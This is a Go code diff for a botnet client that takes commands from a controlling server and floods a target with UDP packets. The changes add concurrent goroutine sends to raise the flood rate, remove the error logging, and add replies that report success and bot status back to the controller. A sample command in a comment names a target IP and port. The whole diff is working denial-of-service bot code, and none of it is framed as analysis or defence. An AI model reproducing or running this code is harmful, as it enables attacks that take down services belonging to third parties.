@@ -5,10 +5,9 @@ import (
 	"net"
 	"strconv"
 	"strings"
-	"time"
 )
 
-func CreateDatagramm(data string, address string, port string) (string, *net.UDPAddr) {
+func CreateUdpDatagramm(data string, address string, port string) (string, *net.UDPAddr) {
 	serverAddr, err := net.ResolveUDPAddr("udp", address+":"+port)
 	if err != nil {
 		fmt.Println("Error: ", err)
@@ -20,7 +19,6 @@ func CreateDatagramm(data string, address string, port string) (string, *net.UDP
 func sendUdp(data string, serverAddr *net.UDPAddr) {
 	conn, err := net.DialUDP("udp", nil, serverAddr)
 	if err != nil {
-		fmt.Println("Error: ", err)
 		return
 	}
 	defer conn.Close()
@@ -28,35 +26,34 @@ func sendUdp(data string, serverAddr *net.UDPAddr) {
 	_, err = conn.Write([]byte(data))
 
 	if err != nil {
-		fmt.Println("Error: ", err)
 		return
 	}
 }
 
 func udpFlood(host string, port string, pkg_c int) {
-	udpString := "<DDL>UDP-FLOOD<DDL>"
-	data, serverAddr := CreateDatagramm(udpString, host, port)
+	udpString := "<UDP>BABABUUY<UDP>"
+	data, serverAddr := CreateUdpDatagramm(udpString, host, port)
 
-	fmt.Print("\n[DOS] - Processing")
-	fmt.Println(" - {")
-	fmt.Println("  UDP pkg := ", udpString)
-	fmt.Println("  addr := ", serverAddr)
-
-	flag := true
-
-	if pkg_c != -1 {
+	if pkg_c > 0 {
 		for i := 0; i <= pkg_c; i++ {
 			sendUdp(data, serverAddr)
-		}
-	} else {
-		for flag {
-			sendUdp(data, serverAddr)
+			go sendUdp(data, serverAddr)
+			go sendUdp(data, serverAddr)
+			go sendUdp(data, serverAddr)
+
 		}
 	}
-	fmt.Print("} - ")
-	fmt.Println("<DDL>UDP-FLOOD -- STOPED")
-
 }
+
+func sendData(conn net.Conn, data string) {
+	_, err := conn.Write([]byte(data))
+	fmt.Println("[Send] " + data)
+	if err != nil {
+		fmt.Println("Error sending data:", err)
+		return
+	}
+}
+
 func getIpPortWC(str string) (string, string, int) {
 
 	cmdList := strings.Split(str, " ")
@@ -82,7 +79,7 @@ func status() {
 }
 
 // DDOS cmd -> DDOS 163.217.31.78 8888 64
-func source(cmd string) {
+func source(cmd string, conn net.Conn) {
 	cmdParam, _ := getSourceParram(cmd)
 
 	fmt.Println(cmd)
@@ -91,7 +88,10 @@ func source(cmd string) {
 	case "/ddos-udp":
 		ip, port, pkg_c := getIpPortWC(cmd)
 		udpFlood(ip, port, pkg_c)
+		sendData(conn, "Udp.Flood&Success")
 
+	case "/bot-status":
+		sendData(conn, "<200> connection - Stable & err - 0")
 	}
 }
 
@@ -102,13 +102,10 @@ func main() {
 	buffer := make([]byte, 1024)
 
 	for {
-		n, err := conn.Read(buffer)
+		n, _ := conn.Read(buffer)
 		req := string(buffer[:n])
 
-		if err != nil {
-			time.Sleep(1)
-		} else {
-			source(req)
-		}
+		source(req, conn)
+
 	}
 }
